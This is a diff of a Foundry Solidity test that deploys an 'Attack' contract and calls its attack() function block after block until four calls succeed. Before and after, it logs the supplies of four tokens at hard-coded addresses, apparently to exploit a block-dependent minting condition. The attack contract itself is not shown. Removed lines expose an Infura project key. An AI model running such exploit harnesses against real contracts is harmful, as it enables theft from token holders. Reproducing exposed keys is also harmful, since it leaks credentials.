@@ -1,30 +1,54 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import {IERC20} from "forge-std/interfaces/IERC20.sol";
 import {Test, console2} from "forge-std/Test.sol";
+import {Attack} from "../src/Attack.sol";
 
 contract ForkTest is Test {
-    // the identifiers of the forks
-    uint256 optimismFork;
-
-    //Access variables from .env file via vm.envString("varname")
-    //Replace ALCHEMY_KEY by your alchemy key or Etherscan key, change RPC url if need
-    //inside your .env file e.g:
-    //MAINNET_RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/ALCHEMY_KEY'
-    //string MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
-    //string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");
-
-    // create two _different_ forks during setup
+    address public attack;
     function setUp() public {
-        // optimismFork = vm.createFork(
-        //     "https://optimism-mainnet.infura.io/v3/84ae029a3e6242a49c0e49d18fdcfc01"
-        // );
+        // deploy attack contract
+        Attack _attack = new Attack();
+        attack = address(_attack);
     }
 
-    // set `block.number` of a fork
     function testAttack() public {
-        // vm.selectFork(optimismFork);
-        address bentoUtil = address(0xBc1Bb37A522EDB1cAa073ac2B3DEbAcd5E89D81d);
+        allCollectionTotalSupply();
+
+        uint256 crystalCount = 0;
+        uint256 spentBlock = 0;
+        for (; crystalCount < 4; ) {
+            (bool success, bytes memory data) = attack.call(
+                abi.encodeWithSignature("attack()")
+            );
+
+            if (!success) {
+                console2.log(block.number, " failed, try next block");
+            } else {
+                console2.log(block.number, " success");
+                crystalCount++;
+            }
+
+            // move to next block
+            spentBlock++;
+            vm.roll(block.number + 1);
+            console2.log("block.number: ", block.number);
+        }
+
+        console2.log("spentBlock: ", spentBlock);
+
+        allCollectionTotalSupply();
     }
+}
+
+function allCollectionTotalSupply() {
+    address crystal = address(0x77c5dcE7824C267dbc70A1aEeD98a6E1bf05Ae59);
+    address inferno = address(0x59F4f027039e13095c5de3B7b03c37049F057a89);
+    address atmos = address(0xAF0bE63a5B13600AEa47157321234aF656f3C0D0);
+    address aquatica = address(0x4cE9204cA90562194303990B2266504f26Af62B2);
+    console2.log("crystal supply: ", IERC20(crystal).totalSupply());
+    console2.log("inferno supply: ", IERC20(inferno).totalSupply());
+    console2.log("atmos supply: ", IERC20(atmos).totalSupply());
+    console2.log("aquatica supply: ", IERC20(aquatica).totalSupply());
 }
